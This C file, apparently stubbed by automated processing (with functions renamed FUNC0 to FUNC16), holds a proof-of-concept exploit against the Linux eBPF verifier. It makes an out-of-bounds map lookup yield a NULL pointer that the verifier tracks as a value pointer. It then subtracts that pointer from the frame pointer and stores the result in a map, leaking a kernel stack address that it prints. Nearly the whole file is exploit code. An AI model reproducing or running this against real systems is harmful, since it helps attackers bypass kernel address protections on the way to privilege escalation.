#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct bpf_insn {int dummy; } ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (struct bpf_insn*) ; 
 int /*<<< orphan*/  BPF_ADD ; 
 struct bpf_insn FUNC1 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 struct bpf_insn FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  BPF_DW ; 
 struct bpf_insn FUNC3 (int /*<<< orphan*/ ) ; 
 struct bpf_insn FUNC4 () ; 
 int /*<<< orphan*/  BPF_FUNC_map_lookup_elem ; 
 struct bpf_insn FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  BPF_JNE ; 
 struct bpf_insn FUNC6 (int /*<<< orphan*/ ,int) ; 
 struct bpf_insn FUNC7 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 struct bpf_insn FUNC8 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  BPF_REG_0 ; 
 int /*<<< orphan*/  BPF_REG_9 ; 
 int /*<<< orphan*/  BPF_REG_ARG1 ; 
 int /*<<< orphan*/  BPF_REG_ARG2 ; 
 int /*<<< orphan*/  BPF_REG_FP ; 
 struct bpf_insn FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 struct bpf_insn FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  BPF_SUB ; 
 int /*<<< orphan*/  BPF_W ; 
 int FUNC11 (int,int) ; 
 int /*<<< orphan*/  FUNC12 (int,int /*<<< orphan*/ ) ; 
 int FUNC13 (struct bpf_insn*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (int) ; 

int FUNC16(void) {
  int small_map = FUNC11(8, 1);
  struct bpf_insn insns[] = {
    // load NULL pointer, tracked as "NULL or value pointer", into r0
    FUNC6(BPF_REG_ARG1, small_map),
    FUNC8(BPF_REG_ARG2, BPF_REG_FP),
    FUNC1(BPF_ADD, BPF_REG_ARG2, -4),
    FUNC10(BPF_W, BPF_REG_ARG2, 0, 9), //oob index
    FUNC3(BPF_FUNC_map_lookup_elem),

    // compute r9 = laundered_frame_pointer
    FUNC8(BPF_REG_9, BPF_REG_FP),
    FUNC2(BPF_SUB, BPF_REG_9, BPF_REG_0),

    // store r9 into map
    FUNC6(BPF_REG_ARG1, small_map),
    FUNC8(BPF_REG_ARG2, BPF_REG_FP),
    FUNC1(BPF_ADD, BPF_REG_ARG2, -4),
    FUNC10(BPF_W, BPF_REG_ARG2, 0, 0),
    FUNC3(BPF_FUNC_map_lookup_elem),
    FUNC5(BPF_JNE, BPF_REG_0, 0, 1),
    FUNC4(),
    FUNC9(BPF_DW, BPF_REG_0, BPF_REG_9, 0),

    FUNC7(BPF_REG_0, 0),
    FUNC4()
  };
  int sock_fd = FUNC13(insns, FUNC0(insns));
  FUNC15(sock_fd);
  FUNC14("leaked pointer: 0x%lx\n", FUNC12(small_map, 0));
}